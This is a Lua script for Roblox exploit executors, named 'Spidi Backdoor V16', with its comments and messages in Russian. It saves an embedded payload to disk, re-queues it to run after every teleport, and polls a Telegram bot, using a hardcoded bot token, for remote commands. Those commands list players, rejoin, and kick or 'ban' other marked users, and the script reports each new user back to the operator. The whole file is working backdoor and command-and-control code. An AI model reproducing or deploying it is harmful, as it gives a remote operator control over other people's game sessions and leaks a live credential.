local function saveScript()
    local writefile = syn and syn.writefile or writefile or fluxus and fluxus.writefile
    if not writefile then return false end
    
    local scriptPath = "SpidiBackdoor.lua"
    local fullScript = [=[
repeat wait() until game:IsLoaded()

local BOT_TOKEN = "8778091630:AAEvqz_bo9fat2Or2Q_XYeeMWS2QBFPMRXc"
local CHAT_ID = nil

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local Debris = game:GetService("Debris")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local SoundService = game:GetService("SoundService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local function req(url, method, headers, body)
    local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
    if not f then return nil end
    local a = {Url = url, Method = method or "GET", Headers = headers or {}}
    if body then a.Body = body end
    local ok, r = pcall(f, a)
    if ok and r then return r else return nil end
end

local function send(text)
    if not CHAT_ID then return end
    local p = {chat_id = CHAT_ID, text = text, parse_mode = "HTML"}
    req("https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage", "POST", {["Content-Type"] = "application/json"}, HttpService:JSONEncode(p))
end

local function getChat()
    local r = req("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates")
    if r and r.Body then
        local ok, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
        if ok and d and d.result and #d.result > 0 then
            CHAT_ID = d.result[#d.result].message.chat.id
            return true
        end
    end
    return false
end

local scriptUsers = {}
local myPlayer = Players.LocalPlayer

local function addUser(p)
    if not scriptUsers[p.UserId] then
        scriptUsers[p.UserId] = p
        send("🟢 <b>"..p.Name.."</b> подключился!")
    end
end

addUser(myPlayer)

local m = Instance.new("BoolValue")
m.Name = "SpidiUser"
m.Parent = myPlayer

local function findPlayer(inp)
    if not inp or inp == "" then return nil, "❌ Введи ник" end
    local users = {}
    for _, p in pairs(Players:GetPlayers()) do
        if scriptUsers[p.UserId] then table.insert(users, p) end
    end
    local num = tonumber(inp)
    if num and users[num] then return users[num] end
    inp = inp:lower()
    local matches = {}
    for _, p in pairs(users) do
        if p.Name:lower():find(inp, 1, true) or p.DisplayName:lower():find(inp, 1, true) then
            table.insert(matches, p)
        end
    end
    if #matches == 1 then return matches[1]
    elseif #matches > 1 then
        local names = {}
        for _, p in pairs(matches) do table.insert(names, p.Name) end
        return nil, "Найдено несколько: "..table.concat(names, ", ")
    else return nil, "Игрок не найден" end
end

local function getUsers()
    local list = {}
    local i = 1
    for _, p in pairs(Players:GetPlayers()) do
        if scriptUsers[p.UserId] then
            table.insert(list, i..". "..p.Name)
            i = i + 1
        end
    end
    return list
end

local function getAll()
    local list = {}
    local i = 1
    for _, p in pairs(Players:GetPlayers()) do
        local hs = scriptUsers[p.UserId] and " 🔥" or ""
        table.insert(list, i..". "..p.Name..hs)
        i = i + 1
    end
    return list
end

local function handleCommand(cmd, args)
    if cmd == "start" then
        send("✅ Spidi V16 запущен!\n👤 Hacker228")
        return
    end
    if cmd == "players" then
        local list = getUsers()
        if #list == 0 then send("👥 Пользователей: 0") else send("👥 <b>Пользователи:</b>\n"..table.concat(list, "\n")) end
        return
    end
    if cmd == "pc" then
        local list = getAll()
        if #list == 0 then send("👥 Игроков: 0") else send("👥 <b>Все игроки:</b>\n"..table.concat(list, "\n").."\n\n🔥 - Spidi") end
        return
    end
    if cmd == "help" then
        send("📋 Команды: /players, /pc, /kick, /ban, /unban, /help")
        return
    end
    if cmd == "server" then
        local name = MarketplaceService:GetProductInfo(game.PlaceId).Name
        local count = 0
        for _, p in pairs(Players:GetPlayers()) do if scriptUsers[p.UserId] then count = count + 1 end end
        send("🖥️ Сервер: "..name.."\nID: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers().."\nSpidi: "..count)
        return
    end
    if cmd == "rejoin" then
        send("🔄 Перезаход...")
        TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
        return
    end
    
    local name = args[1]
    if not name then send("❌ Укажи ник") return end
    local target, err = findPlayer(name)
    if not target then send("❌ "..err) return end
    
    if target == myPlayer then
        if cmd == "kick" or cmd == "ban" then
            send("❌ Нельзя кикнуть/забанить себя!")
            return
        end
    end
    
    if cmd == "kick" then
        target:Kick("Kicked by Spidi")
        send("✅ Кикнут: <b>"..target.Name.."</b>")
        return
    end
    if cmd == "ban" then
        target:Kick("Banned by Spidi")
        send("✅ Забанен: <b>"..target.Name.."</b>")
        return
    end
    if cmd == "unban" then
        target:Kick("Unbanned by Spidi")
        send("✅ Разбанен: <b>"..target.Name.."</b>")
        return
    end
    send("❌ Неизвестная команда. /help")
end

local oldPlayers = {}
local function checkNew()
    for _, p in pairs(Players:GetPlayers()) do
        if not oldPlayers[p.UserId] then
            if p:FindFirstChild("SpidiUser") then addUser(p) end
            oldPlayers[p.UserId] = true
        end
    end
end

spawn(function()
    while true do
        pcall(checkNew)
        wait(3)
    end
end)

local lastId = 0
local function poll()
    local url = "https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastId + 1)
    local r = req(url, "GET", {})
    if r and r.Body then
        local ok, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
        if ok and d and d.result then
            for _, upd in pairs(d.result) do
                if upd.message and upd.message.text then
                    local msg = upd.message
                    if not CHAT_ID then
                        CHAT_ID = msg.chat.id
                        send("✅ Spidi V16 запущен!\n👤 Hacker228")
                    end
                    local text = msg.text
                    if text:sub(1,1) == "/" then
                        local parts = {}
                        for w in string.gmatch(text, "%S+") do table.insert(parts, w) end
                        local cmd = parts[1]:sub(2):lower()
                        table.remove(parts, 1)
                        handleCommand(cmd, parts)
                    end
                end
                if upd.update_id then lastId = upd.update_id end
            end
        end
    end
end

spawn(function()
    while true do
        pcall(poll)
        wait(2)
    end
end)

local function createGUI()
    local player = Players.LocalPlayer
    if not player then return end
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then gui = Instance.new("PlayerGui", player) end
    local screen = Instance.new("ScreenGui")
    screen.Name = "Spidi Backdoor"
    screen.ResetOnSpawn = false
    screen.Parent = gui
    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
    frame.Size = UDim2.new(0, 482, 0, 276)
    frame.Position = UDim2.new(0.5, -241, 0.5, -138)
    frame.Active = true
    frame.Parent = screen
    local stroke = Instance.new("UIStroke")
    stroke.Thickness = 2
    stroke.Color = Color3.fromRGB(255,255,255)
    stroke.Parent = frame
    local grad = Instance.new("UIGradient")
    grad.Rotation = 50
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255,0,0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0,255,0))
    })
    grad.Parent = stroke
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1,0,0,50)
    title.Position = UDim2.new(0,0,0,10)
    title.Text = "Spidi Backdoor V16"
    title.TextColor3 = Color3.fromRGB(0,255,0)
    title.TextSize = 36
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.Parent = frame
    local desc = Instance.new("TextLabel")
    desc.BackgroundTransparency = 1
    desc.Size = UDim2.new(1,-40,0,80)
    desc.Position = UDim2.new(0,20,0,70)
    desc.Text = "Spidi Backdoor Active!\nCommands Available"
    desc.TextColor3 = Color3.fromRGB(0,255,0)
    desc.TextSize = 18
    desc.Font = Enum.Font.GothamBold
    desc.TextWrapped = true
    desc.TextXAlignment = Enum.TextXAlignment.Center
    desc.Parent = frame
    local btn = Instance.new("TextButton")
    btn.BackgroundColor3 = Color3.fromRGB(60,60,80)
    btn.Size = UDim2.new(0,140,0,40)
    btn.Position = UDim2.new(0.5,-70,0.75,0)
    btn.Text = "OK"
    btn.TextColor3 = Color3.fromRGB(255,255,255)
    btn.TextSize = 18
    btn.Font = Enum.Font.GothamBold
    btn.Parent = frame
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0,6)
    btnCorner.Parent = btn
    btn.MouseButton1Click:Connect(function() screen:Destroy() end)
    local drag = false
    local startPos, startMouse, dragInput
    frame.InputBegan:Connect(function(inp)
        if (inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch) and not UserInputService:GetFocusedTextBox() then
            drag = true
            startPos = frame.Position
            startMouse = inp.Position
            inp.Changed:Connect(function()
                if inp.UserInputState == Enum.UserInputState.End then drag = false end
            end)
        end
    end)
    frame.InputChanged:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
            dragInput = inp
        end
    end)
    UserInputService.InputChanged:Connect(function(inp)
        if inp == dragInput and drag then
            local delta = inp.Position - startMouse
            frame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

createGUI()
wait(3)
getChat()
if CHAT_ID then
    send("✅ Spidi V16 запущен!\n👤 Hacker228\n/players - пользователи\n/pc - все игроки\n/help - команды")
end
]=]

    writefile(scriptPath, fullScript)
    print("[Spidi] ✅ Скрипт сохранён: "..scriptPath)
    return true
end

local function autoExecute()
    local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport
    if queueteleport then
        queueteleport("loadfile('SpidiBackdoor.lua')()")
        print("[Spidi] ✅ queue_on_teleport сработал")
        return true
    end
    return false
end

print("[Spidi] ========================================")
print("[Spidi] 🚀 Spidi V16 (БЕЗ ГИТХАБА)")
print("[Spidi] ========================================")

saveScript()
autoExecute()
loadfile("SpidiBackdoor.lua")()
